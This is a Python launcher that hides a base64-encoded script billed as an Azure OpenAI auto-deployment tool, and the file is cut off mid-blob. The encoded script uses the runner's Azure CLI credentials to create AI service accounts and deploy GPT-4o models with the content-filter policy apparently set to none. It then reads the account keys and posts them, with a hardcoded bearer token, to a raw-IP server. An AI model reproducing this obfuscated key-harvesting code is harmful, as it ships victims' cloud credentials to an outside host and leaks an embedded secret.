#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import base64
import importlib.util
import tempfile
import hashlib
import getpass

# 将原始脚本编码为base64
SCRIPT_DATA = """
IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoKaW1wb3J0IG9zCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc3lzCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmltcG9ydCBpbXBvcnRsaWIudXRpbAoKIyDmo4Dmn6Xlubblronoo4Xkvp3otZYKUkVRVUlSRURfUEFDS0FHRVMgPSB7CiAgICAicHl0eiI6ICJweXR6IiwKICAgICJyZXF1ZXN0cyI6ICJyZXF1ZXN0cyIsCiAgICAiYXp1cmUuaWRlbnRpdHkiOiAiYXp1cmUtaWRlbnRpdHkiLAogICAgImF6dXJlLm1nbXQuY29nbml0aXZlc2VydmljZXMiOiAiYXp1cmUtbWdtdC1jb2duaXRpdmVzZXJ2aWNlcyIsCiAgICAiYXp1cmUuY29yZS5leGNlcHRpb25zIjogImF6dXJlLWNvcmUiCn0KCmRlZiBjaGVja19pbnN0YWxsX2RlcGVuZGVuY2llcygpOgogICAgIiIi5qOA5p+l5bm25a6J6KOF5b+F6KaB55qE5L6d6LWWIiIiCiAgICBwcmludCgi5qOA5p+l5L6d6LWWLi4uIikKICAgIG1pc3NpbmdfcGFja2FnZXMgPSBbXQogICAgZm9yIG1vZHVsZV9uYW1lLCBwYWNrYWdlX25hbWUgaW4gUkVRVUlSRURfUEFDS0FHRVMuaXRlbXMoKToKICAgICAgICAjIOajgOafpeaooeWdl+aYr+WQpuW3suWuieijhQogICAgICAgIHNwZWMgPSBpbXBvcnRsaWIudXRpbC5maW5kX3NwZWMobW9kdWxlX25hbWUuc3BsaXQoJy4nKVswXSkKICAgICAgICBpZiBzcGVjIGlzIE5vbmU6CiAgICAgICAgICAgIHByaW50KGYiISB7bW9kdWxlX25hbWV9IOacquWuieijhSIpCiAgICAgICAgICAgIG1pc3NpbmdfcGFja2FnZXMuYXBwZW5kKHBhY2thZ2VfbmFtZSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIuKckyB7bW9kdWxlX25hbWV9IOW3suWuieijhSIpCiAgICAKICAgICMg5aaC5p6c5pyJ57y65aSx55qE5YyF77yM5LiA5qyh5oCn5a6J6KOF5omA5pyJCiAgICBpZiBtaXNzaW5nX3BhY2thZ2VzOgogICAgICAgIHByaW50KGYiXG7pnIDopoHlronoo4Xku6XkuIvkvp3otZY6IHsnLCAnLmpvaW4obWlzc2luZ19wYWNrYWdlcyl9IikKICAgICAgICB0cnk6CiAgICAgICAgICAgICMg5L2/55SocGlw5LiA5qyh5oCn5a6J6KOF5omA5pyJ57y65aSx55qE5YyFCiAgICAgICAgICAgIHN1YnByb2Nlc3MuY2hlY2tfY2FsbChbc3lzLmV4ZWN1dGFibGUsICItbSIsICJwaXAiLCAiaW5zdGFsbCJdICsgbWlzc2luZ19wYWNrYWdlcykKICAgICAgICAgICAgcHJpbnQoIlxu5omA5pyJ5L6d6LWW5a6J6KOF5a6M5oiQ77yM6YeN5paw5ZCv5Yqo6ISa5pysLi4uXG4iKQogICAgICAgICAgICAKICAgICAgICAgICAgIyDph43mlrDlkK/liqjohJrmnKzku6Xnoa7kv53miYDmnInmqKHlnZfpg73lj6/ku6XmraPnoa7lr7zlhaUKICAgICAgICAgICAgb3MuZXhlY3Yoc3lzLmV4ZWN1dGFibGUsIFtzeXMuZXhlY3V0YWJsZV0gKyBzeXMuYXJndikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYi6Ieq5Yqo5a6J6KOF5L6d6LWW5aSx6LSlOiB7ZX0iKQogICAgICAgICAgICBwcmludCgi6K+35omL5Yqo5a6J6KOF5Lul5LiL5L6d6LWWOiIpCiAgICAgICAgICAgIGZvciBwYWNrYWdlIGluIG1pc3NpbmdfcGFja2FnZXM6CiAgICAgICAgICAgICAgICBwcmludChmIiAgcGlwIGluc3RhbGwge3BhY2thZ2V9IikKICAgICAgICAgICAgc3lzLmV4aXQoMSkKCiMg5YWI5qOA5p+l5bm25a6J6KOF5L6d6LWWCmNoZWNrX2luc3RhbGxfZGVwZW5kZW5jaWVzKCkKCiMg546w5Zyo5a+85YWl5omA6ZyA5qih5Z2XCmltcG9ydCBweXR6CmltcG9ydCByZXF1ZXN0cwpmcm9tIGF6dXJlLmlkZW50aXR5IGltcG9ydCBEZWZhdWx0QXp1cmVDcmVkZW50aWFsCmZyb20gYXp1cmUubWdtdC5jb2duaXRpdmVzZXJ2aWNlcyBpbXBvcnQgQ29nbml0aXZlU2VydmljZXNNYW5hZ2VtZW50Q2xpZW50CmZyb20gYXp1cmUuY29yZS5leGNlcHRpb25zIGltcG9ydCBSZXNvdXJjZUV4aXN0c0Vycm9yCgojIOWFqOWxgOmFjee9rgpTSVRFX0NPTkZJRyA9IHsKICAgICJuYW1lIjogIue+juWbvTLlj7fmnLot6LeR5Y+3MuermSIsCiAgICAiYXV0aG9yaXphdGlvbiI6ICJzMm9STG1kWG9qSDc4dGcxTjRhNk1Pdittc0hoOGVZPSIsCiAgICAiYXBpX2Jhc2VfdXJsIjogImh0dHA6Ly8xNzIuOTYuMTYwLjEyNDo3OTEyL2FwaS9jaGFubmVsLyIKfQoKIyDljLrln5/liJfooagKTE9DQVRJT05TID0gWwogICAgIndlc3R1czMiLCAid2VzdHVzIiwgImVhc3R1cyIsICJlYXN0dXMyIiwgCiAgICAibm9ydGhjZW50cmFsdXMiLCAic291dGhjZW50cmFsdXMiLCAic3dlZGVuY2VudHJhbCIKXQoKIyDmqKHlnovphY3nva4KTU9ERUxTX0NPTkZJRyA9IFsKICAgIHsKICAgICAgICAibmFtZSI6ICJncHQtNG8iLAogICAgICAgICJ2ZXJzaW9uIjogIjIwMjQtMDUtMTMiLAogICAgICAgICJza3UiOiAiR2xvYmFsU3RhbmRhcmQiLAogICAgICAgICJyYXRpbyI6IDAuNAogICAgfSwKICAgIHsKICAgICAgICAibmFtZSI6ICJncHQtNG8iLAogICAgICAgICJ2ZXJzaW9uIjogIjIwMjQtMDgtMDYiLAogICAgICAgICJza3UiOiAiR2xvYmFsU3RhbmRhcmQiLAogICAgICAgICJyYXRpbyI6IDAuNAogICAgfSwKICAgIHsKICAgICAgICAibmFtZSI6ICJncHQtNG8iLAogICAgICAgICJ2ZXJzaW9uIjogIjIwMjQtMTEtMjAiLAogICAgICAgICJza3UiOiAiR2xvYmFsU3RhbmRhcmQiLAogICAgICAgICJyYXRpbyI6IDAuMgogICAgfSwKICAgIHsKICAgICAgICAibmFtZSI6ICJncHQtNG8tbWluaSIsCiAgICAgICAgInZlcnNpb24iOiAiMjAyNC0wNy0xOCIsCiAgICAgICAgInNrdSI6ICJHbG9iYWxTdGFuZGFyZCIsCiAgICAgICAgInJhdGlvIjogMS4wCiAgICB9Cl0KCiMg5pyA5bCP6YWN6aKd6ZiI5YC8Ck1JTl9RVU9UQV9USFJFU0hPTEQgPSA1MDAKCmRlZiBnZXRfcmFuZG9tX3N0cmluZyhsZW5ndGg9OCk6CiAgICAiIiLnlJ/miJDpmo/mnLrlrZfnrKbkuLIiIiIKICAgIGNoYXJzID0gc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2UoY2hhcnMpIGZvciBfIGluIHJhbmdlKGxlbmd0aCkpCgpkZWYgZ2V0X3NoYW5naGFpX3RpbWUoKToKICAgICIiIuiOt+WPluS4iua1t+aXtumXtCIiIgogICAgdHJ5OgogICAgICAgIHNoYW5naGFpX3R6ID0gcHl0ei50aW1lem9uZSgnQXNpYS9TaGFuZ2hhaScpCiAgICAgICAgcmV0dXJuIGRhdGV0aW1lLm5vdyhzaGFuZ2hhaV90eikuc3RyZnRpbWUoIiVZJW0lZCVIJU0iKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJVklbSVkJUglTSIpCgpkZWYgZ2V0X2NyZWRlbnRpYWwoKToKICAgICIiIuiOt+WPlkF6dXJl5Yet6K+BIiIiCiAgICByZXR1cm4gRGVmYXVsdEF6dXJlQ3JlZGVudGlhbCgpCgpkZWYgZ2V0X3N1YnNjcmlwdGlvbl9pZCgpOgogICAgIiIi6I635Y+W5b2T5YmN6K6i6ZiFSUQiIiIKICAgIHRyeToKICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgWyJheiIsICJhY2NvdW50IiwgInNob3ciLCAiLS1xdWVyeSIsICJpZCIsICItbyIsICJ0c3YiXSwgCiAgICAgICAgICAgIGNoZWNrPVRydWUsIAogICAgICAgICAgICBjYXB0dXJlX291dHB1dD1UcnVlLCAKICAgICAgICAgICAgdGV4dD1UcnVlCiAgICAgICAgKQogICAgICAgIHJldHVybiByZXN1bHQuc3Rkb3V0LnN0cmlwKCkKICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYi6I635Y+W6K6i6ZiFSUTlpLHotKU6IHtlfSIpCiAgICAgICAgcmV0dXJuIE5vbmUKCmRlZiBsaXN0X3N1YnNjcmlwdGlvbnMoKToKICAgICIiIuWIl+WHuuaJgOacieWPr+eUqOiuoumYhSIiIgogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbImF6IiwgImFjY291bnQiLCAibGlzdCIsICItLXF1ZXJ5IiwgIltdLntOYW1lOm5hbWUsIElkOmlkfSIsICItbyIsICJqc29uIl0sCiAgICAgICAgICAgIGNoZWNrPVRydWUsCiAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZQogICAgICAgICkKICAgICAgICByZXR1cm4ganNvbi5sb2FkcyhyZXN1bHQuc3Rkb3V0KQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoZiLojrflj5borqLpmIXliJfooajlpLHotKU6IHtlfSIpCiAgICAgICAgcmV0dXJuIFtdCgpkZWYgc2V0X3N1YnNjcmlwdGlvbihzdWJzY3JpcHRpb25faWQpOgogICAgIiIi6K6+572u5b2T5YmN6K6i6ZiFIiIiCiAgICB0cnk6CiAgICAgICAgc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgIFsiYXoiLCAiYWNjb3VudCIsICJzZXQiLCAiLS1zdWJzY3JpcHRpb24iLCBzdWJzY3JpcHRpb25faWRdLAogICAgICAgICAgICBjaGVjaz1UcnVlCiAgICAgICAgKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIuiuvue9ruiuoumYheWksei0pToge2V9IikKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBnZXRfcmVzb3VyY2VfZ3JvdXBzKCk6CiAgICAiIiLojrflj5blvZPliY3lj6/nlKjnmoTotYTmupDnu4QiIiIKICAgIHRyeToKICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgWyJheiIsICJncm91cCIsICJsaXN0IiwgIi0tcXVlcnkiLCAiW10ubmFtZSIsICItbyIsICJ0c3YiXSwKICAgICAgICAgICAgY2hlY2s9VHJ1ZSwKICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICAgICAgdGV4dD1UcnVlCiAgICAgICAgKQogICAgICAgIHJldHVybiByZXN1bHQuc3Rkb3V0LnN0cmlwKCkuc3BsaXQoIlxuIikgaWYgcmVzdWx0LnN0ZG91dC5zdHJpcCgpIGVsc2UgW10KICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvcjoKICAgICAgICByZXR1cm4gWwogICAgICAgICAgICAiUkRkZXBhcnRtZW50IiwKICAgICAgICAgICAgImN1c3RvbWVyc2VydmljZSIsIAogICAgICAgICAgICAiTWFya2V0aW5nIiwKICAgICAgICAgICAgImh1bWFuUmVzb3VyY2VzIiwKICAgICAgICAgICAgImZpbmFuY2UiLAogICAgICAgICAgICAib3BlcmF0aW9ucyIsCiAgICAgICAgICAgICJSRGlubm92YXRpb24iLAogICAgICAgICAgICAiU2FmZXR5IgogICAgICAgIF0KCmRlZiBnZXRfcXVvdGFfZm9yX3JlZ2lvbihzdWJzY3JpcHRpb25faWQsIGxvY2F0aW9uKToKICAgICIiIuiOt+WPluaMh+WumuWMuuWfn+eahOmFjemineS/oeaBryIiIgogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbImF6IiwgInJlc3QiLCAiLS1tZXRob2QiLCAiZ2V0IiwgCiAgICAgICAgICAgICAiLS11cmkiLCBmImh0dHBzOi8vbWFuYWdlbWVudC5henVyZS5jb20vc3Vic2NyaXB0aW9ucy97c3Vic2NyaXB0aW9uX2lkfS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvZ25pdGl2ZVNlcnZpY2VzL2xvY2F0aW9ucy97bG9jYXRpb259L3VzYWdlcz9hcGktdmVyc2lvbj0yMDIzLTA1LTAxIl0sCiAgICAgICAgICAgIGNoZWNrPVRydWUsCiAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZQogICAgICAgICkKICAgICAgICAKICAgICAgICBxdW90YV9kYXRhID0ganNvbi5sb2FkcyhyZXN1bHQuc3Rkb3V0KQogICAgICAgIGdwdDRvX3F1b3RhID0gMAogICAgICAgIGdwdDRvX21pbmlfcXVvdGEgPSAwCiAgICAgICAgCiAgICAgICAgZm9yIGl0ZW0gaW4gcXVvdGFfZGF0YS5nZXQoInZhbHVlIiwgW10pOgogICAgICAgICAgICBpZiBpdGVtLmdldCgibmFtZSIsIHt9KS5nZXQoInZhbHVlIikgPT0gIk9wZW5BSS5HbG9iYWxTdGFuZGFyZC5ncHQtNG8iOgogICAgICAgICAgICAgICAgZ3B0NG9fcXVvdGEgPSBpdGVtLmdldCgibGltaXQiLCAwKQogICAgICAgICAgICBlbGlmIGl0ZW0uZ2V0KCJuYW1lIiwge30pLmdldCgidmFsdWUiKSA9PSAiT3BlbkFJLkdsb2JhbFN0YW5kYXJkLmdwdC00by1taW5pIjoKICAgICAgICAgICAgICAgIGdwdDRvX21pbmlfcXVvdGEgPSBpdGVtLmdldCgibGltaXQiLCAwKQogICAgICAgIAogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICJncHQtNG8iOiBncHQ0b19xdW90YSwKICAgICAgICAgICAgImdwdC00by1taW5pIjogZ3B0NG9fbWluaV9xdW90YQogICAgICAgIH0KICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYi6I635Y+WIHtsb2NhdGlvbn0g6YWN6aKd5L+h5oGv5aSx6LSlOiB7ZX0iKQogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICJncHQtNG8iOiAwLAogICAgICAgICAgICAiZ3B0LTRvLW1pbmkiOiAwCiAgICAgICAgfQoKZGVmIGNyZWF0ZV9hY2NvdW50KGNsaWVudCwgcmVzb3VyY2VfZ3JvdXAsIGxvY2F0aW9uLCBhY2NvdW50X25hbWUpOgogICAgIiIi5Yib5bu66K6k55+l5pyN5Yqh6LSm5oi3IiIiCiAgICBwcmludChmIuWIm+W7uuacjeWKoei0puaItzoge2FjY291bnRfbmFtZX0g5ZyoIHtsb2NhdGlvbn0uLi4iKQogICAgCiAgICB0cnk6CiAgICAgICAgcG9sbGVyID0gY2xpZW50LmFjY291bnRzLmJlZ2luX2NyZWF0ZSgKICAgICAgICAgICAgcmVzb3VyY2VfZ3JvdXBfbmFtZT1yZXNvdXJjZV9ncm91cCwKICAgICAgICAgICAgYWNjb3VudF9uYW1lPWFjY291bnRfbmFtZSwKICAgICAgICAgICAgYWNjb3VudD17CiAgICAgICAgICAgICAgICAic2t1IjogewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIlMwIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJraW5kIjogIkFJU2VydmljZXMiLAogICAgICAgICAgICAgICAgImxvY2F0aW9uIjogbG9jYXRpb24sCiAgICAgICAgICAgICAgICAicHJvcGVydGllcyI6IHsKICAgICAgICAgICAgICAgICAgICAiY3VzdG9tU3ViRG9tYWluTmFtZSI6IGFjY291bnRfbmFtZSwKICAgICAgICAgICAgICAgICAgICAicHVibGljTmV0d29ya0FjY2VzcyI6ICJFbmFibGVkIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgKQogICAgICAgIGFjY291bnQgPSBwb2xsZXIucmVzdWx0KCkKICAgICAgICBwcmludChmIuacjeWKoei0puaIt+WIm+W7uuaIkOWKnzoge2FjY291bnRfbmFtZX0iKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiLliJvlu7rmnI3liqHotKbmiLflpLHotKU6IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgY3JlYXRlX21vZGVsX2RlcGxveW1lbnQoY2xpZW50LCByZXNvdXJjZV9ncm91cCwgYWNjb3VudF9uYW1lLCBtb2RlbF9jb25maWcsIGNhcGFjaXR5KToKICAgICIiIumDqOe9suWNleS4quaooeWeiyIiIgogICAgZGVwbG95bWVudF9uYW1lID0gZiJ7bW9kZWxfY29uZmlnWyduYW1lJ119LXttb2RlbF9jb25maWdbJ3ZlcnNpb24nXX0iCiAgICBwcmludChmIumDqOe9suaooeWeizoge2RlcGxveW1lbnRfbmFtZX0gKOmFjeminToge2NhcGFjaXR5fSkuLi4iKQogICAgCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSBjbGllbnQuZGVwbG95bWVudHMuYmVnaW5fY3JlYXRlX29yX3VwZGF0ZSgKICAgICAgICAgICAgcmVzb3VyY2VfZ3JvdXBfbmFtZT1yZXNvdXJjZV9ncm91cCwKICAgICAgICAgICAgYWNjb3VudF9uYW1lPWFjY291bnRfbmFtZSwKICAgICAgICAgICAgZGVwbG95bWVudF9uYW1lPWRlcGxveW1lbnRfbmFtZSwKICAgICAgICAgICAgZGVwbG95bWVudD17CiAgICAgICAgICAgICAgICAic2t1IjogeyJjYXBhY2l0eSI6IGNhcGFjaXR5LCAibmFtZSI6IG1vZGVsX2NvbmZpZ1snc2t1J119LAogICAgICAgICAgICAgICAgInByb3BlcnRpZXMiOiB7CiAgICAgICAgICAgICAgICAgICAgIm1vZGVsIjogewogICAgICAgICAgICAgICAgICAgICAgICAiZm9ybWF0IjogIk9wZW5BSSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2ZXJzaW9uIjogbW9kZWxfY29uZmlnWyd2ZXJzaW9uJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogbW9kZWxfY29uZmlnWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICJ2ZXJzaW9uVXBncmFkZU9wdGlvbiI6ICJPbmNlQ3VycmVudFZlcnNpb25FeHBpcmVkIiwKICAgICAgICAgICAgICAgICAgICAiZHluYW1pY1Rocm90dGxpbmdFbmFibGVkIjogVHJ1ZSwKICAgICAgICAgICAgICAgICAgICAicmFpUG9saWN5TmFtZSI6ICJNaWNyb3NvZnQuTmlsIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgKS5yZXN1bHQoKQogICAgICAgIAogICAgICAgIHByaW50KGYi5qih5Z6LIHtkZXBsb3ltZW50X25hbWV9IOmDqOe9suaIkOWKnyIpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIuaooeWeiyB7ZGVwbG95bWVudF9uYW1lfSDpg6jnvbLlpLHotKU6IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgZ2V0X2FjY291bnRfa2V5cyhjbGllbnQsIHJlc291cmNlX2dyb3VwLCBhY2NvdW50X25hbWUpOgogICAgIiIi6I635Y+W6LSm5oi35a+G6ZKlIiIiCiAgICB0cnk6CiAgICAgICAga2V5cyA9IGNsaWVudC5hY2NvdW50cy5saXN0X2tleXMoCiAgICAgICAgICAgIHJlc291cmNlX2dyb3VwX25hbWU9cmVzb3VyY2VfZ3JvdXAsCiAgICAgICAgICAgIGFjY291bnRfbmFtZT1hY2NvdW50X25hbWUKICAgICAgICApCiAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgImtleTEiOiBrZXlzLmtleTEsCiAgICAgICAgICAgICJrZXkyIjoga2V5cy5rZXkyCiAgICAgICAgfQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYi6I635Y+W6LSm5oi35a+G6ZKl5aSx6LSlOiB7ZX0iKQogICAgICAgIHJldHVybiBOb25lCgpkZWYgcHVzaF90b19zaXRlX2J5X21vZGVscyhrZXksIGJhc2VfdXJsLCBtb2RlbHNfZm9yX3B1c2gsIHNpdGVfY29uZmlnKToKICAgICIiIuagueaNruWunumZhemDqOe9sueahOaooeWei+aOqOmAgeWIsOermeeCuSIiIgogICAgY3VycmVudF90aW1lID0gZ2V0X3NoYW5naGFpX3RpbWUoKQogICAgCiAgICBpZiBub3QgbW9kZWxzX2Zvcl9wdXNoOgogICAgICAgIHByaW50KCLmsqHmnInlj6/mjqjpgIHnmoTmqKHlnosiKQogICAgICAgIHJldHVybiAwCiAgICAKICAgIHN1Y2Nlc3NfY291bnQgPSAwCiAgICAjIOS+neasoeaOqOmAgeavj+S4quaooeWei+mFjee9rgogICAgZm9yIGNvbmZpZyBpbiBtb2RlbHNfZm9yX3B1c2g6CiAgICAgICAgbmFtZSA9IGYie2NvbmZpZ1snbmFtZV9wcmVmaXgnXX0te2N1cnJlbnRfdGltZX0iCiAgICAgICAgcHJpbnQoZiJcbuato+WcqOaOqOmAgSB7Y29uZmlnWydtb2RlbHMnXX0g6YWN572uLi4uIikKICAgICAgICBzdWNjZXNzID0gcHVzaF9rZXlfdG9fc2l0ZShrZXksIGJhc2VfdXJsLCBjb25maWdbIm1vZGVscyJdLCBuYW1lLCBzaXRlX2NvbmZpZykKICAgICAgICAKICAgICAgICBpZiBzdWNjZXNzOgogICAgICAgICAgICBwcmludChmIuKchSB7Y29uZmlnWydtb2RlbHMnXX0g5o6o6YCB5oiQ5YqfICjlkI3np7A6IHtuYW1lfSkiKQogICAgICAgICAgICBzdWNjZXNzX2NvdW50ICs9IDEKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIuKdjCB7Y29uZmlnWydtb2RlbHMnXX0g5o6o6YCB5aSx6LSlIikKICAgICAgICAKICAgICAgICAjIOS4pOasoeaOqOmAgeS5i+mXtOaaguWBnDHnp5IKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAKICAgIHByaW50KGYiXG7mjqjpgIHlrozmiJAhIOaIkOWKnzoge3N1Y2Nlc3NfY291bnR9L3tsZW4obW9kZWxzX2Zvcl9wdXNoKX0iKQogICAgcmV0dXJuIHN1Y2Nlc3NfY291bnQKCmRlZiBwdXNoX2tleV90b19zaXRlKGtleSwgYmFzZV91cmwsIG1vZGVscywgbmFtZSwgc2l0ZV9jb25maWcpOgogICAgIiIi5o6o6YCB5Y2V5Liq5a+G6ZKl5Yiw5oyH5a6a56uZ54K5IiIiCiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZiJCZWFyZXIge3NpdGVfY29uZmlnWydhdXRob3JpemF0aW9uJ119IiwKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnLAogICAgICAgICdOZXctQXBpLVVzZXInOiAiMSIKICAgIH0KICAgIAogICAgIyDmiYDmnInphY3nva7pg73kvb/nlKjlkIzmoLfnmoRtb2RlbF9tYXBwaW5nCiAgICBtb2RlbF9tYXBwaW5nID0gewogICAgICAgICJncHQtNG8tbWluaSI6ICJncHQtNG8tbWluaS0yMDI0LTA3LTE4IgogICAgfQogICAgCiAgICBkYXRhID0gewogICAgICAgICduYW1lJzogbmFtZSwKICAgICAgICAndHlwZSc6IDMsCiAgICAgICAgJ2tleSc6IGtleSwKICAgICAgICAnb3BlbmFpX29yZ2FuaXphdGlvbic6ICcnLAogICAgICAgICdtYXhfaW5wdXRfdG9rZW5zJzogMCwKICAgICAgICAnYmFzZV91cmwnOiBiYXNlX3VybCwKICAgICAgICAnb3RoZXInOiAnMjAyNC0xMC0wMS1wcmV2aWV3JywKICAgICAgICAnbW9kZWxfbWFwcGluZyc6IGpzb24uZHVtcHMobW9kZWxfbWFwcGluZyksCiAgICAgICAgJ3N0YXR1c19jb2RlX21hcHBpbmcnOiBqc29uLmR1bXBzKHsiNDAzIjogIjQwMSJ9KSwKICAgICAgICAnbW9kZWxzJzogbW9kZWxzLAogICAgICAgICdhdXRvX2Jhbic6IDEsCiAgICAgICAgJ3Rlc3RfbW9kZWwnOiAnJywKICAgICAgICAnZ3JvdXBzJzogJ1siZGVmYXVsdCJdJywKICAgICAgICAnZ3JvdXAnOiAnZGVmYXVsdCcsCiAgICB9CiAgICAKICAgIGZvciBhdHRlbXB0IGluIHJhbmdlKDMpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHNpdGVfY29uZmlnWydhcGlfYmFzZV91cmwnXSwganNvbj1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIHJlc3BvbnNlX2RhdGEgPSByZXNwb25zZS5qc29uKCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlc3BvbnNlX2RhdGEuZ2V0KCdzdWNjZXNzJyk6CiAgICAgICAgICAgICAgICBwcmludChmIuWvhumSpeaOqOmAgeaIkOWKnzoge25hbWV9IikKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBlcnJvcl9tZXNzYWdlID0gcmVzcG9uc2VfZGF0YS5nZXQoJ21lc3NhZ2UnLCAn5pyq55+l6ZSZ6K+vJykKICAgICAgICAgICAgICAgIHByaW50KGYi5a+G6ZKl5o6o6YCB5aSx6LSlOiB7bmFtZX0sIOmUmeivrzoge2Vycm9yX21lc3NhZ2V9IikKICAgICAgICAgICAgICAgIGlmIGF0dGVtcHQgPCAyOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYi562J5b6FNeenkuWQjumHjeivlS4uLiAo5bCd6K+VIHthdHRlbXB0ICsgMn0vMykiKQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYi6K+35rGC5byC5bi4OiB7c3RyKGUpfSIpCiAgICAgICAgICAgIGlmIGF0dGVtcHQgPCAyOgogICAgICAgICAgICAgICAgcHJpbnQoZiLnrYnlvoU156eS5ZCO6YeN6K+VLi4uICjlsJ3or5Uge2F0dGVtcHQgKyAyfS8zKSIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpCiAgICAKICAgIHJldHVybiBGYWxzZQoKZGVmIGdldF9sb2NhdGlvbl9wcmVmaXgobG9jYXRpb24pOgogICAgIiIi6I635Y+W5L2N572u5YmN57yAIiIiCiAgICBpZiBsb2NhdGlvbiA9PSAiZWFzdHVzMiI6CiAgICAgICAgcmV0dXJuICJlczIiCiAgICBlbGlmIGxvY2F0aW9uID09ICJlYXN0dXMiOgogICAgICAgIHJldHVybiAiZXMxIgogICAgZWxpZiBsb2NhdGlvbiA9PSAid2VzdHVzIjoKICAgICAgICByZXR1cm4gIndzMSIKICAgIGVsaWYgbG9jYXRpb24gPT0gIndlc3R1czMiOgogICAgICAgIHJldHVybiAid3MzIgogICAgZWxpZiBsb2NhdGlvbiA9PSAibm9ydGhjZW50cmFsdXMiOgogICAgICAgIHJldHVybiAibmMiCiAgICBlbGlmIGxvY2F0aW9uID09ICJzb3V0aGNlbnRyYWx1cyI6CiAgICAgICAgcmV0dXJuICJzYyIKICAgIGVsaWYgbG9jYXRpb24gPT0gInN3ZWRlbmNlbnRyYWwiOgogICAgICAgIHJldHVybiAic3ciCiAgICBlbHNlOgogICAgICAgIHJldHVybiBsb2NhdGlvbls6Ml0KCmRlZiBtYWluKCk6CiAgICAiIiLkuLvlh73mlbAiIiIKICAgIHByaW50KCJcbj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICBwcmludCgiQXp1cmUgT3BlbkFJIOaooeWei+iHquWKqOWMlumDqOe9suW3peWFtyIpCiAgICBwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4iKQogICAgCiAgICAjIOWIm+W7uuaXpeW/l+ebruW9lQogICAgbG9nX2RpciA9IG9zLn